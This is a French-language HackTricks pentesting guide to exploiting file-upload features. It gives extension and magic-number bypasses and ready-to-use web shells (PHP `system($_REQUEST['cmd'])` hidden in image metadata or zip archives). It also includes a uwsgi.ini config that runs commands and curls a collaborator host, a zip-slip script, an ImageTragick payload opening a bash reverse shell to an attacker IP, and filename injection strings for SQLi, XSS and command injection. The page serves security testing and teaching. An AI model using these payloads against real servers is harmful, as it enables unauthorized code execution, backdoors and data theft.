# Téléchargement de fichiers

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie générale de téléchargement de fichiers

Autres extensions utiles :

- **PHP** : _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Fonctionnement dans PHPv8** : _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP** : _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp :** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion :** _.cfm, .cfml, .cfc, .dbm_
- **Flash** : _.swf_
- **Perl** : _.pl, .cgi_
- **Serveur Web Erlang Yaws** : _.yaws_

### Contourner les vérifications des extensions de fichiers

1. Si applicable, **vérifiez** les **extensions précédentes.** Testez-les également en utilisant des **lettres majuscules** : _pHp, .pHP5, .PhAr ..._
2. _Vérifiez **en ajoutant une extension valide avant** l'extension d'exécution (utilisez également les extensions précédentes) :_
- _file.png.php_
- _file.png.Php5_
3. Essayez d'ajouter **des caractères spéciaux à la fin.** Vous pouvez utiliser Burp pour **bruteforcer** tous les **caractères ascii** et **Unicode**. (_Notez que vous pouvez également essayer d'utiliser les **extensions précédemment** mentionnées_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Essayez de contourner les protections **en trompant le parseur d'extension** du côté serveur avec des techniques comme **doubler** l'**extension** ou **ajouter des données inutiles** (**octets nuls**) entre les extensions. _Vous pouvez également utiliser les **extensions précédentes** pour préparer un meilleur payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Ajoutez **une autre couche d'extensions** à la vérification précédente :
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Essayez de mettre l'**extension exec avant l'extension valide** et priez pour que le serveur soit mal configuré. (utile pour exploiter les mauvaises configurations d'Apache où tout avec l'extension **_**.php**_**, mais** pas nécessairement se terminant par .php** exécutera du code) :
- _ex : file.php.png_
7. Utilisation de **NTFS alternate data stream (ADS)** dans **Windows**. Dans ce cas, un caractère deux-points “:” sera inséré après une extension interdite et avant une autorisée. En conséquence, un **fichier vide avec l'extension interdite** sera créé sur le serveur (par exemple “file.asax:.jpg”). Ce fichier pourrait être modifié plus tard en utilisant d'autres techniques telles que l'utilisation de son nom de fichier court. Le motif “**::$data**” peut également être utilisé pour créer des fichiers non vides. Par conséquent, ajouter un caractère point après ce motif pourrait également être utile pour contourner d'autres restrictions (par exemple “file.asp::$data.”)
8. Essayez de dépasser les limites de nom de fichier. L'extension valide est coupée. Et le PHP malveillant reste. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # moins 4 ici et ajout de .png
# Téléchargez le fichier et vérifiez la réponse combien de caractères il permet. Disons 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Créez le payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Contourner Content-Type, Magic Number, Compression & Redimensionnement

- Contourner les vérifications de **Content-Type** en définissant la **valeur** de l'**en-tête Content-Type** à : _image/png_, _text/plain_, application/octet-stream_
1. Liste de mots pour Content-Type : [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Contourner la vérification du **magic number** en ajoutant au début du fichier les **octets d'une vraie image** (confondre la commande _file_). Ou introduire le shell dans les **métadonnées** :\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ou vous pourriez également **introduire le payload directement** dans une image :\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Si **une compression est ajoutée à votre image**, par exemple en utilisant certaines bibliothèques PHP standard comme [PHP-GD](https://www.php.net/manual/fr/book.image.php), les techniques précédentes ne seront pas utiles. Cependant, vous pourriez utiliser le **PLTE chunk** [**technique définie ici**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) pour insérer du texte qui **survivra à la compression**.
- [**Github avec le code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La page web pourrait également **redimensionner** l'**image**, en utilisant par exemple les fonctions PHP-GD `imagecopyresized` ou `imagecopyresampled`. Cependant, vous pourriez utiliser le **IDAT chunk** [**technique définie ici**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) pour insérer du texte qui **survivra à la compression**.
- [**Github avec le code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Une autre technique pour créer un payload qui **survit à un redimensionnement d'image**, en utilisant la fonction PHP-GD `thumbnailImage`. Cependant, vous pourriez utiliser le **tEXt chunk** [**technique définie ici**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) pour insérer du texte qui **survivra à la compression**.
- [**Github avec le code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Autres astuces à vérifier

- Trouvez une vulnérabilité pour **renommer** le fichier déjà téléchargé (pour changer l'extension).
- Trouvez une vulnérabilité de **Local File Inclusion** pour exécuter le backdoor.
- **Possible divulgation d'informations** :
1. Téléchargez **plusieurs fois** (et en **même temps**) le **même fichier** avec le **même nom**
2. Téléchargez un fichier avec le **nom** d'un **fichier** ou **dossier** qui **existe déjà**
3. Téléchargez un fichier avec **“.”, “..”, ou “…” comme nom**. Par exemple, dans Apache sous **Windows**, si l'application enregistre les fichiers téléchargés dans le répertoire “/www/uploads/”, le nom de fichier “.” créera un fichier appelé “uploads” dans le répertoire “/www/”.
4. Téléchargez un fichier qui peut ne pas être facilement supprimé tel que **“…:.jpg”** dans **NTFS**. (Windows)
5. Téléchargez un fichier sous **Windows** avec des **caractères invalides** tels que `|<>*?”` dans son nom. (Windows)
6. Téléchargez un fichier sous **Windows** en utilisant des **noms réservés** (**interdits**) tels que CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, et LPT9.
- Essayez également de **télécharger un exécutable** (.exe) ou un **.html** (moins suspect) qui **exécutera du code** lorsqu'il sera accidentellement ouvert par la victime.

### Astuces spéciales d'extension

Si vous essayez de télécharger des fichiers sur un **serveur PHP**, [jetez un œil à l'astuce **.htaccess** pour exécuter du code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Si vous essayez de télécharger des fichiers sur un **serveur ASP**, [jetez un œil à l'astuce **.config** pour exécuter du code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Les fichiers `.phar` sont comme les `.jar` pour java, mais pour php, et peuvent être **utilisés comme un fichier php** (en l'exécutant avec php, ou en l'incluant dans un script...)

L'extension `.inc` est parfois utilisée pour des fichiers php qui ne sont utilisés que pour **importer des fichiers**, donc, à un moment donné, quelqu'un aurait pu permettre **l'exécution de cette extension**.

## **Jetty RCE**

Si vous pouvez télécharger un fichier XML sur un serveur Jetty, vous pouvez obtenir [RCE car **les nouveaux \*.xml et \*.war sont automatiquement traités**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Donc, comme mentionné dans l'image suivante, téléchargez le fichier XML dans `$JETTY_BASE/webapps/` et attendez le shell !

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Pour une exploration détaillée de cette vulnérabilité, consultez la recherche originale : [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Les vulnérabilités d'exécution de commande à distance (RCE) peuvent être exploitées sur les serveurs uWSGI si l'on a la capacité de modifier le fichier de configuration `.ini`. Les fichiers de configuration uWSGI utilisent une syntaxe spécifique pour incorporer des variables "magiques", des espaces réservés et des opérateurs. Notamment, l'opérateur '@', utilisé comme `@(filename)`, est conçu pour inclure le contenu d'un fichier. Parmi les différents schémas pris en charge dans uWSGI, le schéma "exec" est particulièrement puissant, permettant la lecture de données à partir de la sortie standard d'un processus. Cette fonctionnalité peut être manipulée à des fins malveillantes telles que l'exécution de commandes à distance ou l'écriture/lecture de fichiers arbitraires lorsqu'un fichier de configuration `.ini` est traité.

Considérez l'exemple suivant d'un fichier `uwsgi.ini` nuisible, montrant divers schémas :
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'exécution de la charge utile se produit lors de l'analyse du fichier de configuration. Pour que la configuration soit activée et analysée, le processus uWSGI doit soit être redémarré (potentiellement après un crash ou en raison d'une attaque par déni de service), soit le fichier doit être configuré pour se recharger automatiquement. La fonction de rechargement automatique, si elle est activée, recharge le fichier à des intervalles spécifiés lors de la détection de modifications.

Il est crucial de comprendre la nature laxiste de l'analyse du fichier de configuration de uWSGI. En particulier, la charge utile discutée peut être insérée dans un fichier binaire (tel qu'une image ou un PDF), élargissant ainsi le champ d'exploitation potentiel.

## **wget File Upload/SSRF Trick**

Dans certaines occasions, vous pouvez constater qu'un serveur utilise **`wget`** pour **télécharger des fichiers** et vous pouvez **indiquer** l'**URL**. Dans ces cas, le code peut vérifier que l'extension des fichiers téléchargés est dans une liste blanche pour s'assurer que seuls les fichiers autorisés seront téléchargés. Cependant, **cette vérification peut être contournée.**\
La **longueur maximale** d'un **nom de fichier** dans **linux** est de **255**, cependant, **wget** tronque les noms de fichiers à **236** caractères. Vous pouvez **télécharger un fichier appelé "A"\*232+".php"+".gif"**, ce nom de fichier **contournera** la **vérification** (car dans cet exemple **".gif"** est une **extension valide**) mais `wget` **renommera** le fichier en **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Notez qu'une **autre option** à laquelle vous pourriez penser pour contourner cette vérification est de faire en sorte que le **serveur HTTP redirige vers un autre fichier**, de sorte que l'URL initiale contourne la vérification, puis wget téléchargera le fichier redirigé avec le nouveau nom. Cela **ne fonctionnera pas** **à moins que** wget ne soit utilisé avec le **paramètre** `--trust-server-names` car **wget téléchargera la page redirigée avec le nom du fichier indiqué dans l'URL d'origine**.

## Outils

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) est un outil puissant conçu pour aider les Pentesters et les Bug Hunters à tester les mécanismes de téléchargement de fichiers. Il exploite diverses techniques de bug bounty pour simplifier le processus d'identification et d'exploitation des vulnérabilités, garantissant des évaluations approfondies des applications web.

## Du téléchargement de fichiers à d'autres vulnérabilités

- Définissez **filename** sur `../../../tmp/lol.png` et essayez d'atteindre un **path traversal**
- Définissez **filename** sur `sleep(10)-- -.jpg` et vous pourriez être en mesure d'atteindre une **injection SQL**
- Définissez **filename** sur `<svg onload=alert(document.domain)>` pour atteindre un XSS
- Définissez **filename** sur `; sleep 10;` pour tester une injection de commande (plus de [trucs d'injection de commandes ici](../command-injection.md))
- [**XSS** dans le téléchargement de fichiers image (svg)](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** fichier **upload** + **XSS** = [**exploitation des Service Workers**](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE dans le téléchargement svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via le téléchargement de fichiers svg](../open-redirect.md#open-redirect-uploading-svg-files)
- Essayez **différents payloads svg** de [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
- [Fameuse vulnérabilité **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Si vous pouvez **indiquer au serveur web de récupérer une image depuis une URL**, vous pourriez essayer d'abuser d'un [SSRF](../ssrf-server-side-request-forgery/index.html). Si cette **image** doit être **enregistrée** sur un site **public**, vous pourriez également indiquer une URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) et **voler des informations de chaque visiteur**.
- [**XXE et CORS** contournement avec le téléchargement de PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
- PDF spécialement conçus pour XSS : La [page suivante présente comment **injecter des données PDF pour obtenir une exécution JS**](../xss-cross-site-scripting/pdf-injection.md). Si vous pouvez télécharger des PDF, vous pourriez préparer un PDF qui exécutera du JS arbitraire suivant les indications données.
- Téléchargez le contenu \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) pour vérifier si le serveur a un **antivirus**
- Vérifiez s'il y a une **limite de taille** lors du téléchargement de fichiers

Voici un top 10 des choses que vous pouvez réaliser en téléchargeant (de [ici](https://twitter.com/SalahHasoneh1/status/1281274120395685889)) :

1. **ASP / ASPX / PHP5 / PHP / PHP3** : Webshell / RCE
2. **SVG** : XSS stocké / SSRF / XXE
3. **GIF** : XSS stocké / SSRF
4. **CSV** : injection CSV
5. **XML** : XXE
6. **AVI** : LFI / SSRF
7. **HTML / JS** : injection HTML / XSS / Open redirect
8. **PNG / JPEG** : attaque par inondation de pixels (DoS)
9. **ZIP** : RCE via LFI / DoS
10. **PDF / PPTX** : SSRF / XXE AVEUGLE

#### Extension Burp

{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Octets d'en-tête magiques

- **PNG** : `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG** : `"\xff\xd8\xff"`

Référez-vous à [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) pour d'autres types de fichiers.

### Téléchargement de fichiers Zip/Tar automatiquement décompressés

Si vous pouvez télécharger un ZIP qui sera décompressé sur le serveur, vous pouvez faire 2 choses :

#### Symlink

Téléchargez un lien contenant des liens symboliques vers d'autres fichiers, puis, en accédant aux fichiers décompressés, vous accéderez aux fichiers liés :
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Décompression dans différents dossiers

La création inattendue de fichiers dans des répertoires lors de la décompression est un problème significatif. Malgré les hypothèses initiales selon lesquelles cette configuration pourrait protéger contre l'exécution de commandes au niveau du système d'exploitation via des téléchargements de fichiers malveillants, le support de compression hiérarchique et les capacités de traversée de répertoires du format d'archive ZIP peuvent être exploités. Cela permet aux attaquants de contourner les restrictions et d'échapper aux répertoires de téléchargement sécurisés en manipulant la fonctionnalité de décompression de l'application ciblée.

Un exploit automatisé pour créer de tels fichiers est disponible sur [**evilarc sur GitHub**](https://github.com/ptoomey3/evilarc). L'utilitaire peut être utilisé comme suit :
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
De plus, le **truc du symlink avec evilarc** est une option. Si l'objectif est de cibler un fichier comme `/flag.txt`, un symlink vers ce fichier doit être créé dans votre système. Cela garantit qu'evilarc ne rencontre pas d'erreurs lors de son fonctionnement.

Voici un exemple de code Python utilisé pour créer un fichier zip malveillant :
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abuser de la compression pour le file spraying**

Pour plus de détails **voir le post original dans** : [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Création d'un Shell PHP** : Le code PHP est écrit pour exécuter des commandes passées par la variable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying et création de fichiers compressés** : Plusieurs fichiers sont créés et une archive zip est assemblée contenant ces fichiers.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification avec un éditeur hexadécimal ou vi** : Les noms des fichiers à l'intérieur du zip sont modifiés en utilisant vi ou un éditeur hexadécimal, changeant "xxA" en "../" pour traverser les répertoires.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Téléchargez ce contenu avec une extension d'image pour exploiter la vulnérabilité **(ImageMagick , 7.0.1-1)** (formez le [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Intégration d'un Shell PHP dans un PNG

Intégrer un shell PHP dans le chunk IDAT d'un fichier PNG peut contourner efficacement certaines opérations de traitement d'image. Les fonctions `imagecopyresized` et `imagecopyresampled` de PHP-GD sont particulièrement pertinentes dans ce contexte, car elles sont couramment utilisées pour redimensionner et rééchantillonner des images, respectivement. La capacité du shell PHP intégré à rester non affecté par ces opérations est un avantage significatif pour certains cas d'utilisation.

Une exploration détaillée de cette technique, y compris sa méthodologie et ses applications potentielles, est fournie dans l'article suivant : ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Cette ressource offre une compréhension complète du processus et de ses implications.

Plus d'informations sur : [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Fichiers Polyglottes

Les fichiers polyglottes servent d'outil unique en cybersécurité, agissant comme des caméléons qui peuvent exister valablement dans plusieurs formats de fichiers simultanément. Un exemple intrigant est un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un hybride qui fonctionne à la fois comme un GIF et une archive RAR. De tels fichiers ne se limitent pas à cette association ; des combinaisons comme GIF et JS ou PPT et JS sont également réalisables.

L'utilité principale des fichiers polyglottes réside dans leur capacité à contourner les mesures de sécurité qui filtrent les fichiers en fonction de leur type. La pratique courante dans diverses applications consiste à autoriser uniquement certains types de fichiers pour le téléchargement—comme JPEG, GIF ou DOC—pour atténuer le risque posé par des formats potentiellement nuisibles (par exemple, JS, PHP ou fichiers Phar). Cependant, un polyglotte, en se conformant aux critères structurels de plusieurs types de fichiers, peut contourner furtivement ces restrictions.

Malgré leur adaptabilité, les polyglottes rencontrent des limitations. Par exemple, bien qu'un polyglotte puisse simultanément incarner un fichier PHAR (PHp ARchive) et un JPEG, le succès de son téléchargement peut dépendre des politiques d'extension de fichier de la plateforme. Si le système est strict concernant les extensions autorisées, la simple dualité structurelle d'un polyglotte peut ne pas suffire à garantir son téléchargement.

Plus d'informations sur : [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Références

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

{{#include ../../banners/hacktricks-training.md}}
